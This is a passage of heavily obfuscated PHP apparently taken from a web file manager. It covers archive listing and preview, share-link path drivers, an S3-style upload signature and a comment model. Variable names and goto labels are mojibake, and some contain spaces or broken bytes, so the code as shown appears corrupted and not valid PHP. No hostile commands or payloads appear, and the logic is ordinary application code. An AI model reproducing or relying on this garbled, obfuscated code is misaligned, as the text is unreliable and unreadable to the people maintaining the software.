(!@file_exists(self::iconvSystem($b‡êíÙ·Ö))) { $fÂŸçƒ»‡ = self::localFilePath($d£ÉâÉ‰ÓÈ, $bÕ‹÷ëÃŠ¼); $b‡êíÙ·Ö = $fÂŸçƒ»‡ ? $fÂŸçƒ»‡ : parent::download($d£ÉâÉ‰ÓÈ, $b‡êíÙ·Ö); } $b‡êíÙ·Ö = self::iconvSystem($b‡êíÙ·Ö); $c÷ĞĞ¤÷î¤ = isset($EÂÀ­Üàˆˆ[$Bã·Õó‹ß«[1066]]) ? $EÂÀ­Üàˆˆ[$Bã·Õó‹ß«[1066]] : $Bã·Õó‹ß«[1067]; goto D½ãÆ§íŞÃ; cö—©âš³œ: Hook::trigger($Bã·Õó‹ß«[1071], $Aˆ”¶‚‡³¦); recursion_dir($Aˆ”¶‚‡³¦, $BÒè¯£›‚ë, $dãë‰°Ø›ô, 0); $Cø¥À¼Áğ = array_merge($BÒè¯£›‚ë, $dãë‰°Ø›ô); goto AµíÌ…‰ˆİ; BÄŠÍ³¯¿°: mk_dir($Aˆ”¶‚‡³¦); $bÕ‹÷ëÃŠ¼ = self::fileExt($A¸ë¹Ü½); $b‡êíÙ·Ö = $Aˆ”¶‚‡³¦ . $Bã·Õó‹ß«[94] . $bÕ‹÷ëÃŠ¼; goto Dâ¡ˆÆ•˜İ; C÷¾î¬ò£Ù: $F‹ó„ÉÕí = self::tmpFileName($A¸ë¹Ü½); $Aˆ”¶‚‡³¦ = TEMP_FILES . $F‹ó„ÉÕí; del_dir($Aˆ”¶‚‡³¦); goto BÄŠÍ³¯¿°; AµíÌ…‰ˆİ: foreach ($Cø¥À¼Áğ as $b®îğë‰Ğê) { $b®îğë‰Ğê = self::iconvApp($b®îğë‰Ğê); self::move($b®îğë‰Ğê, $D˜´ï¤‡Ğ, $Ašïë‚ºä); } del_dir($Aˆ”¶‚‡³¦); if (!$fÂŸçƒ»‡) { del_file($b‡êíÙ·Ö); } goto CŒ¼ëÛºÄ¡; a³µÆ„‚¹Ñ: } public static function unzipList($C•éİ ‡Ø) { goto Bßâ•¨Ÿ½; FÛİ«±ôñ­: if (isset($eŞ”‹ê‘Ûš)) { $cÔ•‚…… = array($eŞ”‹ê‘Ûš[$EÍ•éƒê°º[75]], $eŞ”‹ê‘Ûš[$EÍ•éƒê°º[1072]], $eŞ”‹ê‘Ûš[$EÍ•éƒê°º[28]]); $båÎëÜÎ‰ó = md5(implode($EÍ•éƒê°º[70], $cÔ•‚……)) . $EÍ•éƒê°º[94] . get_path_ext($eŞ”‹ê‘Ûš[$EÍ•éƒê°º[28]]); } else { $cÔ•‚…… = array($f“‡ØÆæ¥[$EÍ•éƒê°º[28]], $f“‡ØÆæ¥[$EÍ•éƒê°º[75]], $f“‡ØÆæ¥[$EÍ•éƒê°º[77]]); $båÎëÜÎ‰ó = md5(implode($EÍ•éƒê°º[70], $cÔ•‚……)) . $EÍ•éƒê°º[94] . $fÉ­‹Ïì‘Â; } if ($b¸èäîˆ¾Ë == -1) { $C«ô´½“· = IO_PATH_SYSTEM_TEMP . "\172\x69\160\x56\x69\145\x77\57{$d—…³ãÌŸ}\x2f{$båÎëÜÎ‰ó}\x2e\154\x6f\147"; $e¼àÄåŞ¨˜ = self::infoFull($C«ô´½“·); if ($e¼àÄåŞ¨˜) { $C«ô´½“· = $e¼àÄåŞ¨˜[$EÍ•éƒê°º[75]]; $e›„ø¢’å = self::getContent($C«ô´½“·); if ($e›„ø¢’å) { $B×ÆÎ×™í¹ = json_decode($e›„ø¢’å, !0); if (count($B×ÆÎ×™í¹) >= $f§¡´öÊ‘) { show_json(sprintf(LNG($EÍ•éƒê°º[1074]), count($B×ÆÎ×™í¹)), !1); } return $B×ÆÎ×™í¹; } } else { $C«ô´½“· = self::mkfile($C«ô´½“·); } } $d§ŠÛÀ¥èŞ = TEMP_FILES . $d—…³ãÌŸ; goto e¯©Ôœ ßË; eìµ¦º…ò¸: self::archiveExt(); del_dir($d§ŠÛÀ¥èŞ); if (!$d•‘ÖÀ¾[$EÍ•éƒê°º[1068]]) { show_json($d•‘ÖÀ¾[$EÍ•éƒê°º[1070]], !1); } goto C°‹´İë; E®»»Ø™êÍ: $f§¡´öÊ‘ = 50000; if (request_url_safe($bÛùâ¿ÄĞ÷)) { $eŞ”‹ê‘Ûš = parse_url_query($bÛùâ¿ÄĞ÷); if (!isset($eŞ”‹ê‘Ûš[$EÍ•éƒê°º[75]])) { show_json($EÍ•éƒê°º[1073], !1); } } $C¯·ïŠËöé = isset($eŞ”‹ê‘Ûš) ? $eŞ”‹ê‘Ûš[$EÍ•éƒê°º[75]] : $bÛùâ¿ÄĞ÷; goto b¨¶êá‹Å; e¯©Ôœ ßË: if (!is_dir($d§ŠÛÀ¥èŞ)) { mk_dir($d§ŠÛÀ¥èŞ); } $F·•…¡‚ìÕ = $d§ŠÛÀ¥èŞ . $EÍ•éƒê°º[8] . $båÎëÜÎ‰ó; if (!@file_exists(self::iconvSystem($F·•…¡‚ìÕ))) { if (isset($eŞ”‹ê‘Ûš)) { url_request($bÛùâ¿ÄĞ÷, $EÍ•éƒê°º[1075], $F·•…¡‚ìÕ); } else { $a¬·àåâƒë = self::localFilePath($bÛùâ¿ÄĞ÷, $fÉ­‹Ïì‘Â); $F·•…¡‚ìÕ = $a¬·àåâƒë ? $a¬·àåâƒë : self::download($bÛùâ¿ÄĞ÷, $F·•…¡‚ìÕ); } } goto B£¶æÏ¤Ò…; B£¶æÏ¤Ò…: $F·•…¡‚ìÕ = self::iconvSystem($F·•…¡‚ìÕ); if ($b¸èäîˆ¾Ë >= 0) { $e‡İµ»¼×ù = isset($C•éİ ‡Ø[$EÍ•éƒê°º[1076]]) ? $C•éİ ‡Ø[$EÍ•éƒê°º[1076]] : !1; $A¦Òçœ«¿ƒ = isset($C•éİ ‡Ø[$EÍ•éƒê°º[28]]) ? $C•éİ ‡Ø[$EÍ•éƒê°º[28]] : $EÍ•éƒê°º[33]; KodArchive::filePreview($F·•…¡‚ìÕ, $b¸èäîˆ¾Ë, $e‡İµ»¼×ù, $A¦Òçœ«¿ƒ); self::archiveExt(); die; } $d•‘ÖÀ¾ = KodArchive::listContent($F·•…¡‚ìÕ); goto eìµ¦º…ò¸; C°‹´İë: $B×ÆÎ×™í¹ = json_encode($d•‘ÖÀ¾[$EÍ•éƒê°º[1070]]); self::setContent($C«ô´½“·, $B×ÆÎ×™í¹); if (count($d•‘ÖÀ¾[$EÍ•éƒê°º[1070]]) >= $f§¡´öÊ‘) { show_json(sprintf(LNG($EÍ•éƒê°º[1074]), count($d•‘ÖÀ¾[$EÍ•éƒê°º[1070]])), !1); } goto D¢ªµÓ¸ÚÜ; Bßâ•¨Ÿ½: $EÍ•éƒê°º =& $_SERVER[ÉóçÄÇ]; $bÛùâ¿ÄĞ÷ = $C•éİ ‡Ø[$EÍ•éƒê°º[75]]; $b¸èäîˆ¾Ë = isset($C•éİ ‡Ø[$EÍ•éƒê°º[1072]]) ? $C•éİ ‡Ø[$EÍ•éƒê°º[1072]] : -1; goto E®»»Ø™êÍ; b¨¶êá‹Å: $f“‡ØÆæ¥ = self::info($C¯·ïŠËöé); $fÉ­‹Ïì‘Â = self::fileExt($f“‡ØÆæ¥); $d—…³ãÌŸ = self::tmpFileName($f“‡ØÆæ¥); goto FÛİ«±ôñ­; D¢ªµÓ¸ÚÜ: return $d•‘ÖÀ¾[$EÍ•éƒê°º[1070]]; goto bšœÇ™¯; bšœÇ™¯: } private static function fileExt($f„ï¼Œƒ×²) { $FÅìÛ¨¼¿ =& $_SERVER[ÉóçÄÇ]; $fÍ‚˜ñˆ­ë = $f„ï¼Œƒ×²[$FÅìÛ¨¼¿[167]]; if ($fÍ‚˜ñˆ­ë == $FÅìÛ¨¼¿[1077]) { $Díò‰ÀÕÑ = $FÅìÛ¨¼¿[1078]; if (substr($f„ï¼Œƒ×²[$FÅìÛ¨¼¿[28]], -strlen($Díò‰ÀÕÑ)) == $Díò‰ÀÕÑ) { $fÍ‚˜ñˆ­ë = $FÅìÛ¨¼¿[1079]; } } self::archiveExt($fÍ‚˜ñˆ­ë); return $fÍ‚˜ñˆ­ë; } private static function zipFileList($A°ÛÚ†Ùƒ×, $AËêŠÀ¢ = false) { $bø¬ÄÇ«Ê =& $_SERVER[ÉóçÄÇ]; $FöÒ¹ÃÆ’´ = array(); foreach ($A°ÛÚ†Ùƒ× as $eğÒÄ¹¢¬¥) { $d¶·šØêÒ = $eğÒÄ¹¢¬¥[$bø¬ÄÇ«Ê[75]]; if ($AËêŠÀ¢) { $d¶·šØêÒ = self::copy($eğÒÄ¹¢¬¥[$bø¬ÄÇ«Ê[75]], $AËêŠÀ¢, $bø¬ÄÇ«Ê[770]); } else { $D‰ø¡ïïá  = self::init($eğÒÄ¹¢¬¥[$bø¬ÄÇ«Ê[75]]); if ($D‰ø¡ïïá ->getType() == $bø¬ÄÇ«Ê[105]) { $d¶·šØêÒ = $D‰ø¡ïïá ->path; } } if ($d¶·šØêÒ && self::local()->exist($d¶·šØêÒ)) { $FöÒ¹ÃÆ’´[$eğÒÄ¹¢¬¥[$bø¬ÄÇ«Ê[75]]] = $d¶·šØêÒ; } } if (!empty($FöÒ¹ÃÆ’´)) { return array_values($FöÒ¹ÃÆ’´); } show_json(LNG($bø¬ÄÇ«Ê[1043]), !1); } public static function tmpFileName($f”É ƒÅÈ) { $d‘áÁ¬Åï =& $_SERVER[ÉóçÄÇ]; $Bõ¶¸”¹¬Ÿ = array($f”É ƒÅÈ[$d‘áÁ¬Åï[28]], $f”É ƒÅÈ[$d‘áÁ¬Åï[75]], $f”É ƒÅÈ[$d‘áÁ¬Åï[77]], $f”É ƒÅÈ[$d‘áÁ¬Åï[481]]); return md5(implode($d‘áÁ¬Åï[70], $Bõ¶¸”¹¬Ÿ)); } private static function localFilePath($D‡İ©¨¥ï”, $D×èºÉì’«) { goto CŠ—ò‹ÎäÔ; D¸„İšò·ô: if ($DœâêÎ“ïÛ == $Bäà­†¼ª[105] || $DœâêÎ“ïÛ == $Bäà­†¼ª[1083]) { if (!$aë¿ÒÙ‡¿º->exist($aë¿ÒÙ‡¿º->path)) { show_json(LNG($Bäà­†¼ª[104]), !1); } return $aë¿ÒÙ‡¿º->path; } return !1; goto d×Áßì–¯³; CŠ—ò‹ÎäÔ: $Bäà­†¼ª =& $_SERVER[ÉóçÄÇ]; if ($D×èºÉì’« == $Bäà­†¼ª[1080] && strtoupper(substr(PHP_OS, 0, 3)) == $Bäà­†¼ª[1081]) { return !1; } $FÚÓšñ¶†ˆ = KodIO::parse($D‡İ©¨¥ï”); goto EÜÁØñ—î‰; EÜÁØñ—î‰: if ($FÚÓšñ¶†ˆ[$Bäà­†¼ª[29]] == KodIO::KOD_SOURCE) { $BØ÷°¼Íµ = Model($Bäà­†¼ª[776])->fileInfoGet(KodIO::sourceID($D‡İ©¨¥ï”)); if (!$BØ÷°¼Íµ[$Bäà­†¼ª[75]]) { show_json($Bäà­†¼ª[1082], !1); } $D‡İ©¨¥ï” = $BØ÷°¼Íµ[$Bäà­†¼ª[75]]; } $aë¿ÒÙ‡¿º = self::init($D‡İ©¨¥ï”); $DœâêÎ“ïÛ = $aë¿ÒÙ‡¿º->getType(); goto D¸„İšò·ô; d×Áßì–¯³: } private static function archiveExt($bŒó³•·é‡ = '') { $GLOBALS[$_SERVER[ÉóçÄÇ][1084]] = $bŒó³•·é‡; } } goto C‹¯”±Ø; D…ğÆ†×ô: class PathDriverDriverShareItem { public function __construct($dÎÑİñ„Ç¦) { $this->pathParse = $dÎÑİñ„Ç¦; } public function __call($bµóåÒ‹Á, $f¨é‹·Å•˜) { $bÉ·–®¤ùÆ =& $_SERVER[ÉóçÄÇ]; if (method_exists($this, $bµóåÒ‹Á)) { return; } $föÛØ¾ê¢© = call_user_func_array(array($bÉ·–®¤ùÆ[1195], $bµóåÒ‹Á), $f¨é‹·Å•˜); $CÑº¸ÆòÎÑ = array($bÉ·–®¤ùÆ[1196], $bÉ·–®¤ùÆ[1197], $bÉ·–®¤ùÆ[1198], $bÉ·–®¤ùÆ[1199], $bÉ·–®¤ùÆ[513], $bÉ·–®¤ùÆ[515], $bÉ·–®¤ùÆ[1200], $bÉ·–®¤ùÆ[106], $bÉ·–®¤ùÆ[1201], $bÉ·–®¤ùÆ[1202]); if (in_array($bµóåÒ‹Á, $CÑº¸ÆòÎÑ)) { $föÛØ¾ê¢© = $this->getPathOuter($föÛØ¾ê¢©); } return $föÛØ¾ê¢©; } public function copy($fáÑ¨ğì‚Ô, $b°Íç›˜, $Eˆç‹´í°‹ = false) { return $this->copyMove($fáÑ¨ğì‚Ô, $b°Íç›˜, $Eˆç‹´í°‹, $_SERVER[ÉóçÄÇ][513]); } public function move($D­äÈê„, $a›²¨˜‡ÓÙ, $d™ƒœƒ±¶ = false) { return $this->copyMove($D­äÈê„, $a›²¨˜‡ÓÙ, $d™ƒœƒ±¶, $_SERVER[ÉóçÄÇ][515]); } private function copyMove($aø…î²©, $dˆÌŠ¨¿•”, $fàİØëé¾¬, $Bš›šá¸ö¸) { goto BÓŸÄ§š‹; eÂÈ›È§ŒÊ: if ($dßå™ÇÜôÑ->pathParse[$a¬‹„•ÔË‹[1030]]) { $dˆÌŠ¨¿•” = $dßå™ÇÜôÑ->pathParse[$a¬‹„•ÔË‹[1030]]; } else { $dˆÌŠ¨¿•” = $BÓˆ¾ÁŒË»; } $fÅšÎš¤¼‘ = IO::copyMove($aø…î²©, $dˆÌŠ¨¿•”, $fàİØëé¾¬, $Bš›šá¸ö¸); $fÅšÎš¤¼‘ = $this->getPathOuter($fÅšÎš¤¼‘); goto EÇá¼Ã‰; BÓŸÄ§š‹: $a¬‹„•ÔË‹ =& $_SERVER[ÉóçÄÇ]; $BÓˆ¾ÁŒË» = $dˆÌŠ¨¿•”; $dßå™ÇÜôÑ = IO::driverMake($dˆÌŠ¨¿•”); goto eÂÈ›È§ŒÊ; EÇá¼Ã‰: return $fÅšÎš¤¼‘; goto d´Éø´ê» ; d´Éø´ê» : } public function pathThis($CñÌ­êÆÊ­) { return get_path_this($this->pathParse[$_SERVER[ÉóçÄÇ][75]]); } public function pathFather($e‡¡çğÙÚ») { return get_path_father($this->pathParse[$_SERVER[ÉóçÄÇ][75]]); } public function iconvSystem($D½È¼çÍ‡) { return $D½È¼çÍ‡; } protected function infoParse($cö³‚Ìéô, $EĞ‚Û³ß– = false) { $F±Öê´È‡Î =& $_SERVER[ÉóçÄÇ]; $EïÄ‹°˜ìõ = $this->pathParse[$F±Öê´È‡Î[460]][$F±Öê´È‡Î[1053]] . $this->pathParse[$F±Öê´È‡Î[1046]]; if ($EĞ‚Û³ß–) { $Bì¾ÕÄ‡ÍĞ = IO::infoWithChildren($EïÄ‹°˜ìõ); } else { $Bì¾ÕÄ‡ÍĞ = IO::info($EïÄ‹°˜ìõ); } $bè¦Ø¥ëæ’ = $this->pathParse[$F±Öê´È‡Î[460]]; return Action($F±Öê´È‡Î[1193])->_shareItemeParse($Bì¾ÕÄ‡ÍĞ, $bè¦Ø¥ëæ’); } public function listAll($F‚÷ò„ÓÛŒ) { $B‰î »ºä =& $_SERVER[ÉóçÄÇ]; $D™²ÁìÀ¶ç = IO::listAll($F‚÷ò„ÓÛŒ); $dó»‡Ñ¹¶‡ = $this->pathParse[$B‰î »ºä[460]]; foreach ($D™²ÁìÀ¶ç as &$b¡¹ñÕÆÇÈ) { check_abort(); $b¡¹ñÕÆÇÈ = array_merge(IO::info($b¡¹ñÕÆÇÈ[$B‰î »ºä[75]]), $b¡¹ñÕÆÇÈ); $b¡¹ñÕÆÇÈ[$B‰î »ºä[84]] = Action($B‰î »ºä[1193])->_shareItemeParse($b¡¹ñÕÆÇÈ, $dó»‡Ñ¹¶‡); } unset($b¡¹ñÕÆÇÈ); return $D™²ÁìÀ¶ç; } public function getPathOuter($dÄê§»ø) { goto eî¼Ÿé¡ÍÚ; eî¼Ÿé¡ÍÚ: $dŠÌáÛ«Î =& $_SERVER[ÉóçÄÇ]; $d§­ºÎ”³– = KodIO::parse($dÄê§»ø); if ($d§­ºÎ”³–[$dŠÌáÛ«Î[29]] == KodIO::KOD_SHARE_ITEM) { return $d§­ºÎ”³–[$dŠÌáÛ«Î[75]]; } goto dÚ½†ø±è‘; dÚ½†ø±è‘: $D”Ê„Å¬õĞ = KodIO::clear($dÄê§»ø); $eÆ—­¤Ş— = KodIO::clear($this->pathParse[$dŠÌáÛ«Î[460]][$dŠÌáÛ«Î[1053]]); $cŸ”Ç ÷á = substr($D”Ê„Å¬õĞ, strlen($eÆ—­¤Ş—)); goto fÖÖêÙáĞÔ; fÖÖêÙáĞÔ: if (substr($D”Ê„Å¬õĞ, 0, strlen($eÆ—­¤Ş—)) != $eÆ—­¤Ş—) { return !1; } return $this->pathParse[$dŠÌáÛ«Î[1047]] . $dŠÌáÛ«Î[8] . ltrim($cŸ”Ç ÷á, $dŠÌáÛ«Î[8]); goto eØ»âÈ¥Ïæ; eØ»âÈ¥Ïæ: } public function getType() { $AêŸ¯ õÅÜ =& $_SERVER[ÉóçÄÇ]; $a¹½ŠÖˆÃŒ = str_replace($AêŸ¯ õÅÜ[71], $AêŸ¯ õÅÜ[33], get_class($this)); return strtolower($a¹½ŠÖˆÃŒ); } public function isTypeObject($d®˜‰Ÿ›½) { return IO::isTypeObject($d®˜‰Ÿ›½); } public function info($A“Í‡Ïêªß) { return $this->infoParse($A“Í‡Ïêªß); } public function infoAuth($f²Ï‚¨ìÖ×) { return $this->infoParse($f²Ï‚¨ìÖ×); } public function infoWithChildren($fß ¶ÜÅêƒ) { return $this->infoParse($fß ¶ÜÅêƒ, !0); } public function infoFull($D´ô‘ù­Òã) { return $this->infoParse($D´ô‘ù­Òã); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($còÙçÖªÆ) { $this->pathParse = $còÙçÖªÆ; } protected function infoParse($A„‹²îñØ‰, $A¹á¬¯ÈŸŠ = false) { $fÎ£ŒŒ¹Şö =& $_SERVER[ÉóçÄÇ]; return Action($fÎ£ŒŒ¹Şö[1052])->sharePathInfo($this->pathParse[$fÎ£ŒŒ¹Şö[75]], !0, $A¹á¬¯ÈŸŠ); } public function listPath($dÙ™§­®, $cïØÌ¬ËÏì = false) { $d‚‡¡òø” =& $_SERVER[ÉóçÄÇ]; $d´èÑÑÍ = IO::listPath($dÙ™§­®, $cïØÌ¬ËÏì); foreach ($d´èÑÑÍ as $d¼ƒë¥Æ’ => $a°ë—ƒ¹†Ó) { if (!in_array($d¼ƒë¥Æ’, array($d‚‡¡òø”[73], $d‚‡¡òø”[74]))) { continue; } foreach ($a°ë—ƒ¹†Ó as $E¹Õ…Œ => $dÜƒ´‰áì¬) { $dÜƒ´‰áì¬ = Action($d‚‡¡òø”[1203])->parsePathChildren($dÜƒ´‰áì¬, array($d‚‡¡òø”[408] => $dÙ™§­®)); $d´èÑÑÍ[$d¼ƒë¥Æ’][$E¹Õ…Œ] = Action($d‚‡¡òø”[1052])->shareItemInfo($dÜƒ´‰áì¬); } } return $d´èÑÑÍ; } public function listAll($cæ‰ŒçÂº™) { $f†˜µÊÒŞ =& $_SERVER[ÉóçÄÇ]; $e «›§ëÇ° = IO::listAll($cæ‰ŒçÂº™); foreach ($e «›§ëÇ° as &$d¸°òåŞã‰) { $d¸°òåŞã‰ = array_merge(IO::info($d¸°òåŞã‰[$f†˜µÊÒŞ[75]]), $d¸°òåŞã‰); $d¸°òåŞã‰[$f†˜µÊÒŞ[84]] = Action($f†˜µÊÒŞ[1052])->shareItemInfo($d¸°òåŞã‰); } unset($d¸°òåŞã‰); return $e «›§ëÇ°; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($B×ÕÏÃˆ²Õ) { parent::__construct($B×ÕÏÃˆ²Õ); $this->signatureVersion($_SERVER[ÉóçÄÇ][210]); } public function uploadFormData($e´ñ‰©Á·ˆ, $a‘»Éìİå„ = 3600) { goto E·†ˆ¶ˆ³×; E·†ˆ¶ˆ³×: $f…‘áƒôéÍ =& $_SERVER[ÉóçÄÇ]; $Cê¡Šè­Ë¹ = $f…‘áƒôéÍ[191]; $Fºôœç‚¯È = $f…‘áƒôéÍ[1204]; goto dî†š©¿‡‘; c©Âà‰œœã: $a°¶§‘ÙÜ = $f…‘áƒôéÍ[1206]; $f·íÖôéï• = $a‘»Éìİå„ . $f…‘áƒôéÍ[33]; $a×„‹¸ÜØ = $f…‘áƒôéÍ[1169]; goto D´…ÏİŒä; dî†š©¿‡‘: $eÕ˜Ğ”’Ûø = $f…‘áƒôéÍ[59]; $E‹Ğ ßß¢ = gmdate($f…‘áƒôéÍ[1205]); $b£‰óìØ = gmdate($f…‘áƒôéÍ[712]); goto c©Âà‰œœã; eÔéÄÆÁº: $Câî‚áñ ¯ = hash_hmac($f…‘áƒôéÍ[1214], $eÕ˜Ğ”’Ûø, $F¦‚É›ßÂŸ, !0); $D„‘›Ù†²Ü = hash_hmac($f…‘áƒôéÍ[1214], $a°¶§‘ÙÜ, $Câî‚áñ ¯, !0); $B´©÷®Œ = hash_hmac($f…‘áƒôéÍ[1214], $bî‰œÆóï, $D„‘›Ù†²Ü); goto CáÏØÂ›Ğ“; D´…ÏİŒä: $f¼ˆì‘—È = array($this->accessKey, $b£‰óìØ, $this->region, $eÕ˜Ğ”’Ûø, $a°¶§‘ÙÜ); $EÚÁ†ïšÇÒ = implode($f…‘áƒôéÍ[8], $f¼ˆì‘—È); $FË…Î”› = array($f…‘áƒôéÍ[1171] => gmdate($f…‘áƒôéÍ[1170], strtotime($f…‘áƒôéÍ[1207])), $f…‘áƒôéÍ[1172] => array(array($f…‘áƒôéÍ[1174] => $this->bucket), array($f…‘áƒôéÍ[1173] => $Cê¡Šè­Ë¹), array($f…‘áƒôéÍ[1175], $f…‘áƒôéÍ[1176], $f…‘áƒôéÍ[33]), array($f…‘áƒôéÍ[1175], $f…‘áƒôéÍ[1208], $f…‘áƒôéÍ[33]), array($f…‘áƒôéÍ[1175], $f…‘áƒôéÍ[1209], $f…‘áƒôéÍ[33]), array($f…‘áƒôéÍ[1177] => $a×„‹¸ÜØ), array($f…‘áƒôéÍ[1210] => $EÚÁ†ïšÇÒ), array($f…‘áƒôéÍ[1211] => $Fºôœç‚¯È), array($f…‘áƒôéÍ[1212] => $E‹Ğ ßß¢), array($f…‘áƒôéÍ[1213] => $f·íÖôéï•))); goto bí‚¡Ñğ»»; bí‚¡Ñğ»»: $bî‰œÆóï = base64_encode(json_encode($FË…Î”›)); $dŠ”÷ëÌ‘Ò = hash_hmac($f…‘áƒôéÍ[1214], $b£‰óìØ, $f…‘áƒôéÍ[1215] . $this->secret, !0); $F¦‚É›ßÂŸ = hash_hmac($f…‘áƒôéÍ[1214], $this->region, $dŠ”÷ëÌ‘Ò, !0); goto eÔéÄÆÁº; CáÏØÂ›Ğ“: $aà®äƒ™ï¨ = array($f…‘áƒôéÍ[209] => $f…‘áƒôéÍ[33], $f…‘áƒôéÍ[1216] => $f…‘áƒôéÍ[33], $f…‘áƒôéÍ[1173] => $Cê¡Šè­Ë¹, $f…‘áƒôéÍ[1177] => $a×„‹¸ÜØ, $f…‘áƒôéÍ[1181] => $bî‰œÆóï, $f…‘áƒôéÍ[1217] => $EÚÁ†ïšÇÒ, $f…‘áƒôéÍ[1218] => $Fºôœç‚¯È, $f…‘áƒôéÍ[1219] => $E‹Ğ ßß¢, $f…‘áƒôéÍ[1220] => $f·íÖôéï•, $f…‘áƒôéÍ[1221] => $B´©÷®Œ, $f…‘áƒôéÍ[175] => $this->getHost()); return $aà®äƒ™ï¨; goto d¬ñ¤®ÈØİ; d¬ñ¤®ÈØİ: } } goto bºã¾Ü•ë”; D­ÍÀ„­á: class CommentModel extends ModelBase { protected $tableName = "\143\157\155\x6d\145\x6e\x74"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\x61\155\145" => "\x63\157\x6d\x6d\x65\x6e\x74\x5f\x6d\x65\164\x61", "\x6d\145\x74\141\106\151\145\x6c\x64" => "\143\x6f\x6d\x6d\x65\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($E„»ïÁÓì) { $e«¡ĞÈ„È =& $_SERVER[ÉóçÄÇ]; if ($E„»ïÁÓì[$e«¡ĞÈ„È[1702]]) { $b•£¨‚Ìù = $this->where(array($e«¡ĞÈ„È[1703] => $E„»ïÁÓì[$e«¡ĞÈ„È[1702]]))->find(); if (!$b•£¨‚Ìù || $b•£¨‚Ìù[$e«¡ĞÈ„È[398]] != $E„»ïÁÓì[$e«¡ĞÈ„È[398]] || $b•£¨‚Ìù[$e«¡ĞÈ„È[478]] != $E„»ïÁÓì[$e«¡ĞÈ„È[478]]) { return !1; } $this->where(array($e«¡ĞÈ„È[1703] => $E„»ïÁÓì[$e«¡ĞÈ„È[1702]]))->setAdd($e«¡ĞÈ„È[1704], 1); } $E„»ïÁÓì[$e«¡ĞÈ„È[1705]] = 0; $E„»ïÁÓì[$e«¡ĞÈ„È[1704]] = 0; $E„»ïÁÓì[$e«¡ĞÈ„È[711]] = 1; return $this->add($E„»ïÁÓì); } public function commentCount($DÍÇŒ¹óùè, $FŸŞŠßº‚Ö) { goto dè‚Ë›Ñ¤ó; dè‚Ë›Ñ¤ó: $dŠ—¥Ã´¸ =& $_SERVER[ÉóçÄÇ]; if (!$DÍÇŒ¹óùè) { return array(); } if (is_string($DÍÇŒ¹óùè) || is_int($DÍÇŒ¹óùè)) { $DÍÇŒ¹óùè = array($DÍÇŒ¹óùè); } goto FÏÙ÷©†¸©; AÆ«ÇêÌ›: return array_to_keyvalue($bäï¬º·¿Æ, $dŠ—¥Ã´¸[478], $dŠ—¥Ã´¸[474]); goto E¼×—‘Ó²; FÏÙ÷©†¸©: $e™ì†Å‚ŠÇ = array($dŠ—¥Ã´¸[478], $dŠ—¥Ã´¸[1706] => $dŠ—¥Ã´¸[474]); $Eæö‰ğŠ°ø = array($dŠ—¥Ã´¸[478] => array($dŠ—¥Ã´¸[7], $DÍÇŒ¹óùè), $dŠ—¥Ã´¸[398] => $FŸŞŠßº‚Ö); $bäï¬º·¿Æ = $this->field($e™ì†Å‚ŠÇ)->where($Eæö‰ğŠ°ø)->group($dŠ—¥Ã´¸[478])->select(); goto AÆ«ÇêÌ›; E¼×—‘Ó²: } public function remove($b °Å™‰Ç«) { $D§’í®Éˆï =& $_SERVER[ÉóçÄÇ]; $fåäÁŸà… = array($D§’í®Éˆï[1703] => $b °Å™‰Ç«); $BğåçŒ¿‡ = $this->where($fåäÁŸà…)->find(); if ($BğåçŒ¿‡[$D§’í®Éˆï[1702]]) { $this->where(array($D§’í®Éˆï[1703] => $BğåçŒ¿‡[$D§’í®Éˆï[1702]]))->setAdd($D§’í®Éˆï[1704], -1); } return $this->where($fåäÁŸà…)->delete(); } public function edit($aİµì‰‚¥†, $A‘«°ˆ±×¨) { $A‘¤°î”è =& $_SERVER[ÉóçÄÇ]; $Cï¯¡Ÿ–ÛÔ = array($A‘¤°î”è[1703] => $aİµì‰‚¥†); return $this->where($Cï¯¡Ÿ–ÛÔ)->save(array($A‘¤°î”è[1707] => $A‘«°ˆ±×¨)); } public function prasise($cĞÍö½›°‘) { $fò‡£à¡•ª =& $_SERVER[ÉóçÄÇ]; $A«Óß›…ãÎ = Model($fò‡£à¡•ª[1708]); $Bò†“–—„ó = array($fò‡£à¡•ª[1703] => $cĞÍö½›°‘, $fò‡£à¡•ª[1503] => USER_ID); $Bí¡±°¹Œã = $A«Óß›…ãÎ->where($Bò†“–—„ó)->find(); if (!$Bí¡±°¹Œã) { $A«Óß›…ãÎ->add($Bò†“–—„ó); $c’´‘àñï = $this->where(array($fò‡£à¡•ª[1703] => $cĞÍö½›°‘))->setAdd($fò‡£à¡•ª[1705], 1); } else { $A«Óß›…ãÎ->where($Bò†“–—„ó)->delete(); $c’´‘àñï = $this->where(array($fò‡£à¡•ª[1703] => $cĞÍö½›°‘))->setAdd($fò‡£à¡•ª[1705], -1); } return $c’´‘àñï; } public function targetInfo($aÌ‘‚ô„Ñ‰, $A‹Õ—åö¾) { goto Ağ¦ Ö»Ò; Ağ¦ Ö»Ò: $D•Ô¨È™åÌ =& $_SERVER[ÉóçÄÇ]; $EºÒ»ë±Ô = array($D•Ô¨È™åÌ[544] => $aÌ‘‚ô„Ñ‰, $D•Ô¨È™åÌ[545] => $A‹Õ—åö¾); $FöˆÁœãæÎ = $this->where($EºÒ»ë±Ô)->count(); goto C¡½¨ê·ö; C¡½¨ê·ö: $EŞ›ğŸå©Ô = "\x52\x49\x47\110\x54\x20\112\x4f\111\116\40{$this->tablePrefix}\x63\x6f\155\155\145\x6e\x74\137\x70\162\141\151\x73\x65\x20\163\x74\141\162\40\157\x6e\x20\143\157\155\155\145\156\x74\x2e\x63\157\x6d\x6d\x65\x6e\164\x49\104\40\75\x20\163\x74\141\x72\x2e\143\157\x6d\155\145\x6e\x74\x49\104"; $fªï®¤²¬† = $this->alias($D•Ô¨È™åÌ[350])->where($EºÒ»ë±Ô)->join($EŞ›ğŸå©Ô, $D•Ô¨È™åÌ[1709])->count(); $BßøÜø³ãŠ = array($D•Ô¨È™åÌ[1710] => $FöˆÁœãæÎ, $D•Ô¨È™åÌ[1711] => $fªï®¤²¬†); goto C‡ê©ƒª•; C‡ê©ƒª•: return $BßøÜø³ãŠ; goto Bô­ïË•ª; Bô­ïË•ª: } public function listData($BÀ¸¡Ò©æ²) { 